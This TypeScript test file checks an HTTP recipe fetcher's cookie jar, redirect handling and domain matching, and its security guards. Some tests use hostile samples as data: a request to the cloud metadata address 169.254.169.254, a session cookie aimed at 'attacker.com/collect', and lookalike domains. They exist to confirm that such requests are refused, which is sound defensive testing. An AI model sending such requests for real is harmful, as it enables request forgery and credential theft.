import { describe, expect, it } from 'vitest'
import { hostMatchesDomain, makeHttpFetch } from './http-fetch.ts'
import type { HttpRecipe } from './recipe.ts'

const recipe = (over: Partial<HttpRecipe> = {}): HttpRecipe => ({
  version: 1,
  kind: 'http',
  sourceId: 'demo',
  request: { url: 'https://example.com/api', method: 'GET' },
  pagination: { mode: 'increment', param: 'page', start: 1, step: 1, itemsAt: 'data', maxPages: 2 },
  assert: [],
  mapping: {},
  ...over,
})

const okJson = (body: unknown) =>
  (async () => new Response(JSON.stringify(body), { status: 200 })) as unknown as typeof fetch

describe('makeHttpFetch', () => {
  it('sends the resolved request and returns the parsed JSON', async () => {
    const seen: { url?: string; method?: string } = {}
    const spy = (async (u: URL, init: RequestInit) => {
      seen.url = String(u)
      seen.method = init.method
      return new Response(JSON.stringify({ data: [1] }), { status: 200 })
    }) as unknown as typeof fetch

    const run = makeHttpFetch(recipe(), undefined, spy)
    const out = await run({ url: 'https://example.com/api?page=1', method: 'GET', headers: {} })

    expect(out).toEqual({ data: [1] })
    expect(seen.url).toBe('https://example.com/api?page=1')
    expect(seen.method).toBe('GET')
  })

  // A shareable recipe carries a URL an author chose — that makes RecipeRequest a
  // request-forgery primitive. Without this guard a recipe reads cloud metadata or
  // Stream's own admin API from inside the trust boundary.
  it('refuses a private / link-local host', async () => {
    const run = makeHttpFetch(recipe(), undefined, okJson({ data: [] }))
    await expect(run({ url: 'http://169.254.169.254/latest/meta-data/', method: 'GET', headers: {} }))
      .rejects.toThrow(/non-public URL/)
    await expect(run({ url: 'http://localhost:4555/api/streams', method: 'GET', headers: {} }))
      .rejects.toThrow(/non-public URL/)
  })

  it('attaches the broker cookie when cookieDomain covers the request host', async () => {
    let sentCookie: string | undefined
    const spy = (async (_u: URL, init: RequestInit) => {
      sentCookie = (init.headers as Record<string, string>).cookie
      return new Response(JSON.stringify({ data: [] }), { status: 200 })
    }) as unknown as typeof fetch

    const run = makeHttpFetch(
      recipe({ cookieDomain: 'example.com' }),
      async () => 'sid=abc',
      spy,
    )
    // subdomain of the declared cookieDomain — covered
    await run({ url: 'https://m.example.com/api', method: 'GET', headers: {} })
    expect(sentCookie).toBe('sid=abc')
  })

  // The exfiltration shape: name one domain's credential, send it to another. Zero code
  // required, so a declarative-only recipe does NOT make this safe by itself.
  it('refuses when cookieDomain does not cover the request host', async () => {
    let called = false
    const spy = (async () => {
      called = true
      return new Response('{}', { status: 200 })
    }) as unknown as typeof fetch

    const run = makeHttpFetch(recipe({ cookieDomain: 'victim.com' }), async () => 'sid=secret', spy)
    await expect(run({ url: 'https://attacker.com/collect', method: 'GET', headers: {} }))
      .rejects.toThrow(/does not cover request host/)
    expect(called).toBe(false)
  })

  it('does not ask the broker for a cookie when no cookieDomain is declared', async () => {
    let asked = false
    const run = makeHttpFetch(recipe(), async () => {
      asked = true
      return 'sid=abc'
    }, okJson({ data: [] }))
    await run({ url: 'https://example.com/api', method: 'GET', headers: {} })
    expect(asked).toBe(false)
  })

  it('throws on a non-2xx so the scheduler sees a failure, not an empty feed', async () => {
    const dead = (async () => new Response('nope', { status: 503 })) as unknown as typeof fetch
    const run = makeHttpFetch(recipe(), undefined, dead)
    await expect(run({ url: 'https://example.com/api', method: 'GET', headers: {} }))
      .rejects.toThrow(/503/)
  })
})

describe('makeHttpFetch — jar / params 钩子 / parse / redirect', () => {
  /** doFetch mock：按 URL 前缀分派响应，并记录每个请求的 (url, cookie, redirect)。 */
  const record = () => {
    const seen: Array<{ url: string; cookie?: string; redirect?: string }> = []
    const routes: Array<{ prefix: string; make: () => Response }> = []
    const spy = (async (u: URL, init: RequestInit) => {
      seen.push({
        url: String(u),
        cookie: (init.headers as Record<string, string>).cookie,
        redirect: init.redirect as string | undefined,
      })
      const hit = routes.find((r) => String(u).startsWith(r.prefix))
      return hit ? hit.make() : new Response('{}', { status: 200 })
    }) as unknown as typeof fetch
    return { seen, routes, spy }
  }

  it('jar：上游 Set-Cookie 在后续请求携带，首个请求不带', async () => {
    const { seen, routes, spy } = record()
    routes.push({
      prefix: 'https://a.example.com/login',
      make: () => new Response('{}', { status: 200, headers: [['set-cookie', 'SESS=tok1; Path=/']] }),
    })
    const r = recipe({
      jar: true,
      compute: { capabilities: [], prefetch: [{ as: 'p1', request: { url: 'https://a.example.com/login', method: 'GET' } }] },
    })
    const run = makeHttpFetch(r, undefined, spy)
    await run({ url: 'https://a.example.com/main', method: 'GET', headers: {}, params: {} })
    expect(seen[0].cookie).toBeUndefined()
    expect(seen[1].cookie).toBe('SESS=tok1')
  })

  it('jar：跨域不流动——b.com 种的 cookie 上不了 a.com 的请求', async () => {
    const { seen, routes, spy } = record()
    routes.push({
      prefix: 'https://b.example.org/plant',
      make: () => new Response('{}', { status: 200, headers: [['set-cookie', 'steal=1; Path=/']] }),
    })
    const r = recipe({
      jar: true,
      compute: { capabilities: [], prefetch: [{ as: 'p1', request: { url: 'https://b.example.org/plant', method: 'GET' } }] },
    })
    const run = makeHttpFetch(r, undefined, spy)
    await run({ url: 'https://a.example.com/main', method: 'GET', headers: {}, params: {} })
    expect(seen[1].url).toBe('https://a.example.com/main')
    expect(seen[1].cookie).toBeUndefined()
  })

  it('jar 与 broker cookie 按名去重、jar 胜（服务端取首个重名，靠追加压不住）', async () => {
    const { seen, routes, spy } = record()
    routes.push({
      prefix: 'https://a.example.com/login',
      make: () => new Response('{}', { status: 200, headers: [['set-cookie', 'SESS=fresh; Path=/']] }),
    })
    const r = recipe({
      jar: true,
      cookieDomain: 'a.example.com',
      compute: { capabilities: [], prefetch: [{ as: 'p1', request: { url: 'https://a.example.com/login', method: 'GET' } }] },
    })
    const run = makeHttpFetch(r, async () => 'SESS=stale; UID=u1', spy)
    await run({ url: 'https://a.example.com/main', method: 'GET', headers: {}, params: {} })
    const pairs = new Map(seen[1].cookie!.split('; ').map((p) => p.split('=') as [string, string]))
    expect(pairs.get('SESS')).toBe('fresh')
    expect(pairs.get('UID')).toBe('u1')
    expect(pairs.size).toBe(2)
  })

  it('parse:none 不触碰 body（HTML 页不炸）、parse:text 存文本，sign 都读得到', async () => {
    const { routes, spy } = record()
    routes.push({ prefix: 'https://a.example.com/html', make: () => new Response('<html>wall</html>', { status: 200 }) })
    routes.push({ prefix: 'https://a.example.com/txt', make: () => new Response('plain-token', { status: 200 }) })
    const r = recipe({
      compute: {
        capabilities: [],
        prefetch: [
          { as: 'page', parse: 'none', request: { url: 'https://a.example.com/html', method: 'GET' } },
          { as: 'tok', parse: 'text', request: { url: 'https://a.example.com/txt', method: 'GET' } },
        ],
        sign: '(() => ({ headers: { "x-pre": String(input.pre.page) + "|" + input.pre.tok } }))()',
      },
    })
    let sentHeader: string | undefined
    const spy2 = (async (u: URL, init: RequestInit) => {
      if (String(u).includes('/api')) sentHeader = (init.headers as Record<string, string>)['x-pre']
      return (spy as unknown as (u: URL, i: RequestInit) => Promise<Response>)(u, init)
    }) as unknown as typeof fetch
    const run = makeHttpFetch(r, undefined, spy2)
    await run({ url: 'https://example.com/api', method: 'GET', headers: {}, params: {} })
    expect(sentHeader).toBe('null|plain-token')
  })

  it('compute.params 先于 prefetch 跑：产物填 prefetch 模板与主请求残留洞', async () => {
    const { seen, spy } = record()
    const r = recipe({
      compute: {
        capabilities: [],
        params: '(() => ({ surl: input.params.pwd_id.slice(1), t: String(input.now * 1000) }))()',
        prefetch: [{ as: 'v', request: { url: 'https://a.example.com/verify?surl={surl}&t={t}', method: 'GET' } }],
      },
    })
    const run = makeHttpFetch(r, undefined, spy, () => 42)
    await run({ url: 'https://example.com/api?surl={surl}', method: 'GET', headers: {}, params: { pwd_id: '1X99' } })
    expect(seen[0].url).toBe('https://a.example.com/verify?surl=X99&t=42000')
    expect(seen[1].url).toBe('https://example.com/api?surl=X99')
  })

  it('redirect:manual 透传 fetch init，且 3xx 的 Set-Cookie 被吸收（acceptNonOk）', async () => {
    const { seen, routes, spy } = record()
    routes.push({
      prefix: 'https://a.example.com/landing',
      make: () => new Response('', { status: 302, headers: [['set-cookie', 'BDCLND=r1; Path=/'], ['location', 'https://a.example.com/next']] }),
    })
    const r = recipe({
      jar: true,
      acceptNonOk: true,
      compute: {
        capabilities: [],
        prefetch: [{ as: 'landing', parse: 'none', request: { url: 'https://a.example.com/landing', method: 'GET', redirect: 'manual' } }],
      },
    })
    const run = makeHttpFetch(r, undefined, spy)
    await run({ url: 'https://a.example.com/main', method: 'GET', headers: {}, params: {} })
    expect(seen[0].redirect).toBe('manual')
    expect(seen[1].redirect).toBe('follow')
    expect(seen[1].cookie).toBe('BDCLND=r1')
  })
})

describe('默认出站通道', () => {
  // 守的是「不注入 doFetch 时走的是 owned 通道，不是进程全局 fetch」。
  // owned-outbound.sentinel.test.ts 守的是另一半——owned 自己没被 patch；
  // 两条都要，否则把 `doFetch ?? ownedFetch` 改回 `?? fetch` 全量照样绿，
  // 而那一改就让 recipe 出站重新暴露在 RSSHub request-rewriter 的全局改写下。
  it('不经 globalThis.fetch——即使它在 import 之后被替换', async () => {
    const original = globalThis.fetch
    let globalCalls = 0
    // 必须用一个**公网形状**的主机名：回环地址会被 publicHttpUrl 在发请求之前挡掉,
    // 那样两条通道都走不到 fetch,判据就恒真了(第一版就是这么写废的)。
    // `.invalid` 是 RFC 2606 保留后缀,解析必然失败——所以不会真的出网,
    // 但已经足够走到"该调哪个 fetch"那一步。
    globalThis.fetch = (...args: Parameters<typeof fetch>) => {
      globalCalls++
      return original(...args)
    }
    try {
      const url = 'https://recipe-outbound-probe.invalid/api'
      const run = makeHttpFetch(recipe({ request: { url, method: 'GET' } }))
      await run({ url, method: 'GET', headers: {}, params: {} }).catch(() => {})
      expect(globalCalls).toBe(0)
    } finally {
      globalThis.fetch = original
    }
  })
})

describe('hostMatchesDomain', () => {
  it('matches the domain itself and its subdomains, not a suffix lookalike', () => {
    expect(hostMatchesDomain('lizhi.fm', 'lizhi.fm')).toBe(true)
    expect(hostMatchesDomain('m.lizhi.fm', 'lizhi.fm')).toBe(true)
    expect(hostMatchesDomain('LIZHI.FM', 'lizhi.fm')).toBe(true)
    // the bug this guards: endsWith('lizhi.fm') alone would pass "evil-lizhi.fm"
    expect(hostMatchesDomain('evil-lizhi.fm', 'lizhi.fm')).toBe(false)
    expect(hostMatchesDomain('lizhi.fm.attacker.com', 'lizhi.fm')).toBe(false)
  })
})
